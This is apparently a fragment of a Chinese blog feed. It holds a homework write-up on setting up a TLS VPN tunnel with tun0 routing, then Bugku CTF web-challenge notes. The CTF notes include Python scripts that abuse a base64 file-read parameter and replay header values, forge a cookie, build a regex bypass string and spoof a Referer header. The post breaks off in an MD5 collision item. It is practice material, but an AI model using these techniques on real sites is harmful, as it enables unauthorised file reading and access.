<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717105919161.png" alt="image-20210717105919161"></p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717200542030.png" alt="image-20210717200542030"></p>
<h2 id="建立TLS通信"><a href="#建立TLS通信" class="headerlink" title="建立TLS通信"></a>建立TLS通信</h2><h3 id="VPN-server"><a href="#VPN-server" class="headerlink" title="VPN server"></a>VPN server</h3><p>首先在VPN服务器上执行以下命令，将c程序编译为可执行程序</p>
<pre><code class="hljs llvm">gcc -o vpnserver_tls vpnserver_tls.<span class="hljs-keyword">c</span> -lssl -lcrypto -lcrypt</code></pre>

<p>执行编译好的程序，此时该程序处于监听状态等待客户端的连接</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717110722763.png" alt="image-20210717110722763"></p>
<p>此时该程序将创建一个<code>tun0</code>虚拟网卡，使用以下命令配置网卡信息</p>
<pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> ifconfig tun<span class="hljs-number">0</span> <span class="hljs-number">192.168.53.1</span>/<span class="hljs-number">24</span> up</code></pre>

<p>配置完后的网卡信息如图：</p>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717104726586.png" alt="image-20210717104726586" style="zoom:67%;">

<p>编辑路由表并将设置为转发模式</p>
<pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> route add –net <span class="hljs-number">192.168.53.0</span>/<span class="hljs-number">24</span> tun<span class="hljs-number">0</span>
<span class="hljs-attribute">sudo</span> sysctl net.ipv<span class="hljs-number">4</span>.ip_forward=<span class="hljs-number">1</span></code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717092728424.png" alt="image-20210717092728424"></p>
<h3 id="VPN-client"><a href="#VPN-client" class="headerlink" title="VPN client"></a>VPN client</h3><p>与服务器上一样，首先编译c程序</p>
<pre><code class="hljs llvm">gcc -o vpnclient_tls vpnclient_tls.<span class="hljs-keyword">c</span> -lssl -lcrypto</code></pre>

<p>执行该程序（该域名与上面创建的证书中的通用名称一样）</p>
<pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> ./vpnclient_tls <span class="hljs-string">&quot;sunzy.com&quot;</span> <span class="hljs-number">4433</span></code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717111325426.png" alt="image-20210717111325426"></p>
<p>创建连接后，服务器端确认后，开始身份认证</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717111437904.png" alt="image-20210717111437904"></p>
<p>服务器端收到的消息如下</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717111535076.png" alt="image-20210717111535076"></p>
<p>此时TLS连接已经建立。</p>
<p>配置tun0和路由表</p>
<pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> ifconfig tun<span class="hljs-number">0</span> <span class="hljs-number">192.168.53.5</span>/<span class="hljs-number">24</span> up
<span class="hljs-attribute">sudo</span> route add -net <span class="hljs-number">192.168.60.0</span>/<span class="hljs-number">24</span></code></pre>

<h3 id="Host-V"><a href="#Host-V" class="headerlink" title="Host V"></a>Host V</h3><p>要实现内外网主机之间的通信，还需要在内网主机上添加路由表信息</p>
<pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> route add -net <span class="hljs-number">192.168.53.0</span>/<span class="hljs-number">24</span> gw <span class="hljs-number">192.168.60.1</span> enp<span class="hljs-number">0</span>s<span class="hljs-number">3</span></code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717113001100.png" alt="image-20210717113001100"></p>
<h3 id="VPN-server和VPN-client-的连接信息"><a href="#VPN-server和VPN-client-的连接信息" class="headerlink" title="VPN server和VPN client 的连接信息"></a>VPN server和VPN client 的连接信息</h3><p><code>VPN server</code></p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717160935019.png" alt="image-20210717160935019"></p>
<p><code>VPN client</code></p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717161031264.png" alt="image-20210717161031264"></p>
<h2 id="通信验证"><a href="#通信验证" class="headerlink" title="通信验证"></a>通信验证</h2><h3 id="ping-测试-1"><a href="#ping-测试-1" class="headerlink" title="ping 测试"></a>ping 测试</h3><ul>
<li>客户端（10.0.2.7）ping 内网主机（192.168.60.101）</li>
</ul>
<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210717104553457.png" alt="image-20210717104553457" style="zoom:67%;">

<ul>
<li>内网主机(192.168.60.101) ping 10.0.2.7 </li>
</ul>
<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210717104633291.png" alt="image-20210717104633291" style="zoom:67%;">

<p>查看客户端上的 Wireshark 数据时，我们看到 ping 请求从 tun0 发送到内部网络 IP，并且此数据包从 VPN 客户端发送到 VPN tunnel</p>
<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210717153451936.png" alt="image-20210717153451936" style="zoom:67%;">

<p>在服务器端，我们看到类似的流量——主机 U 和主机 V 之间的 ping 请求和回复通信，中间有 VPN 服务器。 </p>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717133757659.png" alt="image-20210717133757659" style="zoom:67%;">

<h3 id="telnet-测试"><a href="#telnet-测试" class="headerlink" title="telnet 测试"></a>telnet 测试</h3><ul>
<li>首先在在Host U上使用telnet控制Host V</li>
</ul>
<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210717114933233.png" alt="image-20210717114933233" style="zoom: 67%;">

<ul>
<li>在内网主机Host V 上telnet 客户端HostU </li>
</ul>
<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210717115511290.png" alt="image-20210717115511290" style="zoom: 67%;">

<p>wireshark抓取的telnet的通信数据包</p>
<p>VPN server上的数据包信息</p>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717153538769.png" alt="image-20210717153538769" style="zoom:67%;">

<h2 id="命令集合"><a href="#命令集合" class="headerlink" title="命令集合"></a>命令集合</h2><h3 id="VPN-server-1"><a href="#VPN-server-1" class="headerlink" title="VPN server"></a>VPN server</h3><pre><code class="hljs shell">//编译程序
gcc -o vpnserver_tls vpnserver_tls.c -lssl -lcrypto -lcrypt
//启动程序
sudo ./vpnserver_tls 4433</code></pre>

<pre><code class="hljs shell">//设置tun0信息 添加转发功能 添加路由
sudo ifconfig tun0 192.168.53.1/24 up
sudo sysctl net.ipv4.ip_forward=1
sudo route add -net 192.168.53.0/24 tun0
sudo route add -net 192.168.60.0/24 tun0</code></pre>

<h3 id="VPN-client-1"><a href="#VPN-client-1" class="headerlink" title="VPN client"></a>VPN client</h3><pre><code class="hljs awk"><span class="hljs-regexp">//</span>编译程序
gcc -o vpnclient_tls vpnclient_tls.c -lssl -lcrypto
<span class="hljs-regexp">//</span>启动程序
sudo ./vpnclient_tls sunzy.com <span class="hljs-number">4433</span></code></pre>

<pre><code class="hljs armasm"><span class="hljs-comment">//设置tun0信息  添加路由</span>
<span class="hljs-symbol">sudo</span> ifconfig tun0 <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">53</span>.<span class="hljs-number">5</span>/<span class="hljs-number">24</span> up
<span class="hljs-symbol">sudo</span> route <span class="hljs-keyword">add</span> -net <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">60</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span></code></pre>

<h3 id="内网主机"><a href="#内网主机" class="headerlink" title="内网主机"></a>内网主机</h3><pre><code class="hljs apache"><span class="hljs-attribute">route</span> add -net <span class="hljs-number">192.168.53.0</span>/<span class="hljs-number">24</span> gw <span class="hljs-number">192.168.60.1</span> enp<span class="hljs-number">0</span>s<span class="hljs-number">3</span></code></pre>

]]></content>
      <categories>
        <category>homework</category>
      </categories>
      <tags>
        <tag>socket</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku刷题记录2</title>
    <url>/2020/09/10/bugku1/</url>
    <content><![CDATA[<h1 id="bugku刷题记录2"><a href="#bugku刷题记录2" class="headerlink" title="bugku刷题记录2"></a>bugku刷题记录2</h1><span id="more"></span>





<h2 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h2><p>打开页面查看源码什么也没有</p>
<p>抓包看了看，惊喜的发现了flag字段</p>
<p><img src="https://i.loli.net/2020/11/30/K7zFInPiQEkjvY6.png" alt></p>
<p>一段base64 解码后为<code>NDQyMDIy</code></p>
<p>提交发现并不对。。。看来另有玄机</p>
<p>多go几次后发现了flag值一直在变，并且有一段提示</p>
<p><code>&lt;!-- OK ,now you have to post the margin what you find --&gt;</code></p>
<p>用post方法提交你所发现的内容，只好使用脚本（不会写）</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> base64
url=<span class="hljs-string">&quot;http://120.24.86.145:8002/web6/&quot;</span>
r=requests.session()
headers=r.get(url).headers<span class="hljs-comment">#因为flag在消息头里</span>
 
mid=base64.b64decode(headers[<span class="hljs-string">&#x27;flag&#x27;</span>])
mid=mid.decode()<span class="hljs-comment">#为了下一步用split不报错，b64decode后操作的对象是byte类型的字符串，而split函数要用str类型的</span>
 
flag = base64.b64decode(mid.split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">1</span>])<span class="hljs-comment">#获得flag:后的值</span>
data=&#123;<span class="hljs-string">&#x27;margin&#x27;</span>:flag&#125;
<span class="hljs-built_in">print</span> (r.post(url,data).text)<span class="hljs-comment">#post方法传上去</span></code></pre>

<p><img src="https://i.loli.net/2020/11/30/7ydLFG96krwuQDn.png" alt="headers.png"></p>
<h2 id="cookie欺骗"><a href="#cookie欺骗" class="headerlink" title="cookie欺骗"></a>cookie欺骗</h2><p>注意观察url<code>http://123.206.87.240:8002/web11/index.php?line=2&amp;filename=a2V5cy50eHQ=</code></p>
<p>line=2&amp;filename=a2V5cy50eHQ=</p>
<p><code>a2V5cy50eHQ=</code> 解密是为key.txt   line是行的意思，这里应该是查看key.txt的第line行的代码</p>
<p>这里可以查看<code>index.php</code>源码  index.php的base64值为<code>aW5kZXgucGhw</code></p>
<p><img src="https://i.loli.net/2020/11/30/k7VDufCye3x4WAE.png" alt="cookie1.png"></p>
<p>改变line的值可以一行一行的查看源码，可以使用脚本</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
url1 = <span class="hljs-string">&quot;http://123.206.87.240:8002/web11/index.php?line=&quot;</span>
url2 = <span class="hljs-string">&quot;&amp;filename=aW5kZXgucGhw&quot;</span>
mysession = requests.session()
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">40</span>):    
    r = mysession.get(url1+<span class="hljs-built_in">str</span>(i)+url2)    
print(r.text)


</code></pre>

<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

error_reporting(<span class="hljs-number">0</span>);

<span class="hljs-variable">$file</span>=base64_decode(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]:<span class="hljs-string">&quot;&quot;</span>);

<span class="hljs-variable">$line</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;line&#x27;</span>])?intval(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;line&#x27;</span>]):<span class="hljs-number">0</span>;

<span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>==<span class="hljs-string">&#x27;&#x27;</span>) header(<span class="hljs-string">&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;</span>);

<span class="hljs-variable">$file_list</span> = <span class="hljs-keyword">array</span>(

<span class="hljs-string">&#x27;0&#x27;</span> =&gt;<span class="hljs-string">&#x27;keys.txt&#x27;</span>,

<span class="hljs-string">&#x27;1&#x27;</span> =&gt;<span class="hljs-string">&#x27;index.php&#x27;</span>,

);

 

<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;margin&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;margin&#x27;</span>]==<span class="hljs-string">&#x27;margin&#x27;</span>)&#123;       <span class="hljs-comment">//看这里</span>

<span class="hljs-variable">$file_list</span>[<span class="hljs-number">2</span>]=<span class="hljs-string">&#x27;keys.php&#x27;</span>;

&#125;

 

<span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$file_list</span>))&#123;

<span class="hljs-variable">$fa</span> = file(<span class="hljs-variable">$file</span>);

<span class="hljs-keyword">echo</span> <span class="hljs-variable">$fa</span>[<span class="hljs-variable">$line</span>];

&#125;

<span class="hljs-meta">?&gt;</span></code></pre>



<p><code>if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]==&#39;margin&#39;)</code></p>
<p> 这里可以判断cookie必须满足margin=margin才能访问keys.php</p>
<p><img src="https://i.loli.net/2020/11/30/5c9Ip8Rgn2xL4iS.png" alt="bp"></p>
<h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h2><p>查看源码提示了</p>
<p><code>&lt;!--1p.html--&gt;</code>     </p>
<p>直接访问1p.html,发现直接跳转到了bugku的主页，先看源码，发现一段编码应该是base64</p>
<pre><code class="hljs gcode">JTIyJT<span class="hljs-symbol">NCaWYlMjglMjElMjRfR0</span>VUJT<span class="hljs-attr">VCJTI3</span>aWQlMjcl<span class="hljs-symbol">NUQlMjklMEElN0</span>IlMEElMDloZWFkZXIlMjglMjdMb<span class="hljs-number">2</span><span class="hljs-symbol">NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4</span>aXQlMjglMjkl<span class="hljs-name">M0</span>IlMEEl<span class="hljs-symbol">N0</span>QlMEElMjRpZCUzRCUy<span class="hljs-symbol">NF9</span>HRVQl<span class="hljs-symbol">NUIlMjdpZCUyNyU1</span>RCUzQiUwQSUy<span class="hljs-symbol">NGElM0</span>QlMjRfR<span class="hljs-number">0</span>VUJT<span class="hljs-attr">VCJTI3</span>YSUy<span class="hljs-symbol">NyU1</span>RCUzQiUwQSUy<span class="hljs-symbol">NGIlM0</span>QlMjRfR<span class="hljs-number">0</span>VUJT<span class="hljs-attr">VCJTI3</span>YiUy<span class="hljs-symbol">NyU1</span>RCUzQiUwQWlmJTI<span class="hljs-number">4</span>c<span class="hljs-number">3</span>RyaXB<span class="hljs-attr">vcyUyOCUyNGElMkMlMjcuJTI3</span>JTI<span class="hljs-number">5</span>JTI<span class="hljs-number">5</span>JTBBJTdCJTBBJTA<span class="hljs-number">5</span>ZW<span class="hljs-symbol">NobyUyMCUyN25</span>vJTIwb<span class="hljs-name">m8</span>lMjBubyUyM<span class="hljs-name">G5</span>vJTIwb<span class="hljs-name">m8</span>lMjBubyUyM<span class="hljs-name">G5</span>vJTI<span class="hljs-number">3</span>JT<span class="hljs-symbol">NCJTBBJTA5</span>cmV<span class="hljs-number">0</span>dXJuJTIwJT<span class="hljs-symbol">NCJTBBJTdEJTBBJTI0</span>ZGF<span class="hljs-number">0</span>YSUyMCUzRCUyMEBmaWxlX<span class="hljs-number">2</span>dldF<span class="hljs-number">9</span>jb<span class="hljs-number">250</span>ZW<span class="hljs-number">50</span>cyUyOCUy<span class="hljs-symbol">NGElMkMlMjdyJTI3</span>JTI<span class="hljs-number">5</span>JT<span class="hljs-symbol">NCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3</span>UlMjBpcyUyMGElMjBuaW<span class="hljs-symbol">NlJTIwcGxhdGVmb3</span>JtJTIxJTIyJTIwYW<span class="hljs-number">5</span>kJTIwJTI<span class="hljs-number">0</span>aWQl<span class="hljs-name">M0</span>Ql<span class="hljs-name">M0</span>QwJTIwYW<span class="hljs-number">5</span>kJTIwc<span class="hljs-number">3</span>RybGVuJTI<span class="hljs-number">4</span>JTI<span class="hljs-number">0</span>YiUyOSUzRTUlMjBhbmQlMjBlcmV<span class="hljs-symbol">naSUyOCUyMjExMSUyMi5</span>zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE<span class="hljs-number">0</span>JTIyJTI<span class="hljs-number">5</span>JTIwYW<span class="hljs-number">5</span>kJTIwc<span class="hljs-number">3</span>Vic<span class="hljs-number">3</span>RyJTI<span class="hljs-number">4</span>JTI<span class="hljs-number">0</span>YiUyQzAlMkMxJTI<span class="hljs-number">5</span>JTIxJT<span class="hljs-symbol">NENCUyOSUwQSU3</span>QiUwQSUwOXJlcXVpcmUlMjglMjJm<span class="hljs-symbol">NGwyYTNnLnR4</span>dCUyMiUyOSUzQiUwQSU<span class="hljs-number">3</span>RCUwQW<span class="hljs-attr">Vsc2</span>UlMEEl<span class="hljs-symbol">N0</span>IlMEElMDlwcmludCUyMCUyM<span class="hljs-name">m5</span>ldmVyJTIwbmV<span class="hljs-number">2</span>ZXIlMjBuZXZlciUyMGdpdmUlMjB<span class="hljs-number">1</span>cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU<span class="hljs-number">3</span>RCUwQSUwQSUwQSUzRiUzRQ</code></pre>

<p>base64解码后为url编码</p>
<pre><code class="hljs llvm"><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bif<span class="hljs-variable">%28</span><span class="hljs-variable">%21</span><span class="hljs-variable">%24</span>_GET<span class="hljs-variable">%5</span>B<span class="hljs-variable">%27</span>id<span class="hljs-variable">%27</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%29</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%7</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span>header<span class="hljs-variable">%28</span><span class="hljs-variable">%27</span>Location<span class="hljs-variable">%3</span>A<span class="hljs-variable">%20</span>hello.php<span class="hljs-variable">%3</span>Fid<span class="hljs-variable">%3</span>D<span class="hljs-number">1</span><span class="hljs-variable">%27</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span>exit<span class="hljs-variable">%28</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%7</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span>id<span class="hljs-variable">%3</span>D<span class="hljs-variable">%24</span>_GET<span class="hljs-variable">%5</span>B<span class="hljs-variable">%27</span>id<span class="hljs-variable">%27</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span>a<span class="hljs-variable">%3</span>D<span class="hljs-variable">%24</span>_GET<span class="hljs-variable">%5</span>B<span class="hljs-variable">%27</span>a<span class="hljs-variable">%27</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span>b<span class="hljs-variable">%3</span>D<span class="hljs-variable">%24</span>_GET<span class="hljs-variable">%5</span>B<span class="hljs-variable">%27</span>b<span class="hljs-variable">%27</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>Aif<span class="hljs-variable">%28</span>stripos<span class="hljs-variable">%28</span><span class="hljs-variable">%24</span>a<span class="hljs-variable">%2</span>C<span class="hljs-variable">%27</span>.<span class="hljs-variable">%27</span><span class="hljs-variable">%29</span><span class="hljs-variable">%29</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%7</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span>echo<span class="hljs-variable">%20</span><span class="hljs-variable">%27</span>no<span class="hljs-variable">%20</span>no<span class="hljs-variable">%20</span>no<span class="hljs-variable">%20</span>no<span class="hljs-variable">%20</span>no<span class="hljs-variable">%20</span>no<span class="hljs-variable">%20</span>no<span class="hljs-variable">%27</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span>return<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%7</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span>data<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%20</span><span class="hljs-title">@file_get_contents</span><span class="hljs-variable">%28</span><span class="hljs-variable">%24</span>a<span class="hljs-variable">%2</span>C<span class="hljs-variable">%27</span>r<span class="hljs-variable">%27</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>Aif<span class="hljs-variable">%28</span><span class="hljs-variable">%24</span>data<span class="hljs-variable">%3</span>D<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>bugku<span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>a<span class="hljs-variable">%20</span>nice<span class="hljs-variable">%20</span>plateform<span class="hljs-variable">%21</span><span class="hljs-variable">%22</span><span class="hljs-variable">%20</span><span class="hljs-keyword">and</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>id<span class="hljs-variable">%3</span>D<span class="hljs-variable">%3</span>D<span class="hljs-number">0</span><span class="hljs-variable">%20</span><span class="hljs-keyword">and</span><span class="hljs-variable">%20</span>strlen<span class="hljs-variable">%28</span><span class="hljs-variable">%24</span>b<span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>E<span class="hljs-number">5</span><span class="hljs-variable">%20</span><span class="hljs-keyword">and</span><span class="hljs-variable">%20</span>eregi<span class="hljs-variable">%28</span><span class="hljs-variable">%22111</span><span class="hljs-variable">%22</span>.substr<span class="hljs-variable">%28</span><span class="hljs-variable">%24</span>b<span class="hljs-variable">%2</span>C<span class="hljs-number">0</span><span class="hljs-variable">%2</span>C<span class="hljs-number">1</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span>C<span class="hljs-variable">%221114</span><span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%20</span><span class="hljs-keyword">and</span><span class="hljs-variable">%20</span>substr<span class="hljs-variable">%28</span><span class="hljs-variable">%24</span>b<span class="hljs-variable">%2</span>C<span class="hljs-number">0</span><span class="hljs-variable">%2</span>C<span class="hljs-number">1</span><span class="hljs-variable">%29</span><span class="hljs-variable">%21</span><span class="hljs-variable">%3</span>D<span class="hljs-number">4</span><span class="hljs-variable">%29</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%7</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span>require<span class="hljs-variable">%28</span><span class="hljs-variable">%22</span>f<span class="hljs-number">4</span>l<span class="hljs-number">2</span>a<span class="hljs-number">3</span>g.txt<span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%7</span>D<span class="hljs-variable">%0</span>Aelse<span class="hljs-variable">%0</span>A<span class="hljs-variable">%7</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span>print<span class="hljs-variable">%20</span><span class="hljs-variable">%22</span>never<span class="hljs-variable">%20</span>never<span class="hljs-variable">%20</span>never<span class="hljs-variable">%20</span>give<span class="hljs-variable">%20</span>up<span class="hljs-variable">%20</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%7</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>F<span class="hljs-variable">%3</span>E</code></pre>

<p>url解码为源码</p>
<p><img src="https://i.loli.net/2020/11/30/qpmSYCjHZGeRD8F.png" alt></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
f(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])
&#123;
	header(<span class="hljs-string">&#x27;Location: hello.php?id=1&#x27;</span>);
	<span class="hljs-keyword">exit</span>();
&#125;
<span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];
<span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];
<span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];
<span class="hljs-keyword">if</span>(stripos(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;.&#x27;</span>))
&#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;no no no no no no no&#x27;</span>;
	<span class="hljs-keyword">return</span> ;
&#125;
<span class="hljs-variable">$data</span> = @file_get_contents(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;r&#x27;</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>==<span class="hljs-string">&quot;bugku is a nice plateform!&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-variable">$id</span>==<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> strlen(<span class="hljs-variable">$b</span>)&gt;<span class="hljs-number">5</span> <span class="hljs-keyword">and</span> eregi(<span class="hljs-string">&quot;111&quot;</span>.substr(<span class="hljs-variable">$b</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&quot;1114&quot;</span>) <span class="hljs-keyword">and</span> substr(<span class="hljs-variable">$b</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)!=<span class="hljs-number">4</span>)
&#123;
	<span class="hljs-keyword">require</span>(<span class="hljs-string">&quot;f4l2a3g.txt&quot;</span>); <span class="hljs-comment">//注意这里，flag应该藏在这里</span>
&#125;
<span class="hljs-keyword">else</span>
&#123;
	<span class="hljs-keyword">print</span> <span class="hljs-string">&quot;never never never give up !!!&quot;</span>;
&#125;

<span class="hljs-meta">?&gt;</span></code></pre>

<p>果然藏在f4l2a3g.txt</p>
<p><img src="https://i.loli.net/2020/11/30/ObAgHyeFnp9QM1G.png" alt></p>
<h2 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h2><p>此站没有flag，flag被人删了，不用再做了。–一个做题的路人</p>
<p>flag好像真的被删了，列不出来目录，查看wp也没有复现。</p>
<h2 id="正则？字符？"><a href="#正则？字符？" class="headerlink" title="正则？字符？"></a>正则？字符？</h2><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> 
highlight_file(<span class="hljs-string">&#x27;2.php&#x27;</span>);
<span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;KEY&#123;********************************&#125;&#x27;</span>;
<span class="hljs-variable">$IM</span>= preg_match(<span class="hljs-string">&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;</span>, trim(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>]), <span class="hljs-variable">$match</span>);
<span class="hljs-keyword">if</span>( <span class="hljs-variable">$IM</span> )&#123; 
 <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;key is: &#x27;</span>.<span class="hljs-variable">$key</span>);
&#125;</code></pre>



<p><code>preg_match(&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);</code></p>
<p>重点在这句话上，考点为正则表达式</p>
<blockquote>
<p><strong>定界符：</strong>/和/（一般来说是这两个，其实除了\和字母数字其它的只要是成对出现都可以看做定界符，比如##、！！之类的）；</p>
<p><strong>. （一个点）：</strong>表示可以匹配任何字符；</p>
<p><strong>*  ：</strong>前面的字符重复零次或多次；</p>
<p><strong>{n,m} ：</strong>前面的字符重复4~7次；</p>
<p><strong>\ （反斜线）：</strong>后面的字符被转义；</p>
<p><strong>[a-z] ：</strong>在a到z中匹配 ；</p>
<p><strong>[[:punct:]] ：</strong>匹配任何标点符号；</p>
<p><strong>/i ：</strong>表示这个正则表达式对大小写不敏感；</p>
</blockquote>
<p>因此可以写出符合要求的字符穿</p>
<pre><code class="hljs arcade">keyakey22222key:<span class="hljs-regexp">/a/</span>aaakeyb!</code></pre>

<h2 id="前女友-SKCTF"><a href="#前女友-SKCTF" class="headerlink" title="前女友(SKCTF)"></a>前女友(SKCTF)</h2><p>题目网址打不开</p>
<h2 id="login1-SKCTF"><a href="#login1-SKCTF" class="headerlink" title="login1(SKCTF)"></a>login1(SKCTF)</h2><p>题目网址打不开</p>
<h2 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h2><p>题目提示 are you from google?</p>
<p>你是从google来的吗</p>
<p>考察http头中的referer参数</p>
<p><strong>Referer：浏览器向 WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中的网址/URL。<br>例如：Referer：<a href="http://www.sina.com/">http://www.sina.com/</a></strong> </p>
<p>那么就抓包修改referer这个参数</p>
<p><code>Referer: https://www.google.com/</code>,直接go即可</p>
<h2 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h2><p>源码</p>
<pre><code class="hljs php"><span class="hljs-variable">$md51</span> = md5(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>);
